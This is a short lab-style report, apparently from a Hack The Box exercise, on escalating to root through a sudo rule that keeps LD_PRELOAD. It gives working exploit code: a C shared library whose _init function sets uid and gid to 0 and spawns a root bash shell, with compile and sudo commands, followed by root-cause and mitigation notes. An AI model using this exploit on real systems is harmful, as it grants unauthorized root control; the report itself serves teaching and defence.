This is a technical report on LDPRELOAD escalation of privileges.

The attack was executed on a Ubuntu 20.04 system with the following configuration:

- User: htb-student
- Sudo privileges: (root) NOPASSWD: /usr/bin/openssl
- Sudo configuration: env_keep+=LD_PRELOAD

The attack was executed in three steps:

1. Creation of malicious shared library:
```
   cat > /tmp/root.c << 'EOF'
   #include <stdio.h>
   #include <sys/types.h>
   #include <stdio.h>
   #include <unistd.h>

   void _init() {
       unsetenv("LD_PRELOAD");
       setgid(0);
       setuid(0);
       execl("/bin/bash", "bash", "-p", NULL);
   }
   EOF
```

3. Compilation of the library:
```
   gcc -fPIC -shared -o /tmp/root.so /tmp/root.c -nostartfiles
```

5. Execution of the attack:
```
   sudo LD_PRELOAD=/tmp/root.so /usr/bin/openssl
```

After execution, the attacker obtained a shell with root privileges.

The root cause of this vulnerability is the combination of two factors:

1. The user has sudo rights to execute a program as root.
2. Sudo is configured to preserve the LD_PRELOAD environment variable (env_keep+=LD_PRELOAD).

This allows an attacker to inject a custom library that is loaded when the target program is executed. The custom library contains a special function (init()) that is executed during library initialization, which changes the process uid and gid to 0 and spawns a root shell.

This attack is particularly dangerous because it does not require any exploit of a specific program (like a suid-enabled binary or a vulnerable service). It only requires sudo privileges to run any program as root and the LDPRELOAD environment variable being preserved.

The best mitigations for this issue are:
- Remove LD_PRELOAD from the env_keep option in /etc/sudoers.
- Restrict sudo to specific, well-tested commands that do not rely on environment variables.
- Use sudo with a secure path that excludes writeable directories.
